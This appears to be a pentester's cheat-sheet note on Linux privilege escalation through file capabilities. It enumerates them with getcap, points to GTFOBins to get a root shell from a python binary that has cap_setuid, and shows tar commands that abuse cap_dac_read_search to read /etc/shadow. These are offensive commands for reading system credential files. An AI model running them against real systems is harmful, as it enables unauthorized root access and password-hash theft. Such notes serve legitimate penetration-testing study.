-- -
Similar vector to SUID bit being set. If capabilities are set, it will run from the perspective of root which you can then just hijack to get a shell.
```bash
# find capabilities set on programs
# looking for something like:
# /usr/bin/python2.6 = cap_setuid+ep
# 
# have also pulled it off with:
# /usr/bin/python3.6 = cap_setuid,<other shit> 
getcap -r / 2>/dev/null
```
Then go check [GTFOBins](https://gtfobins.github.io) like you would for the SUID bit.
#### cap_dac_read_search
```bash
# Output you want:
# cap_dac_read_search+ep
# This will allow you to read files on the filesystem as root, so go to GTFObins and do a file read with whatever program comes out if different that the tar show below.
# If tar has this capability:
tar cf shadow.tar /etc/shadow
tar xf shadow.tar
cat /etc/shadow
```
#### Resources
- [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
- [SUID v Capabilities](https://mn3m.info/posts/suid-vs-capabilities/)
- [Capabilities Privesc via OpenSSL w/ SELinux Enabled & Enforced](https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)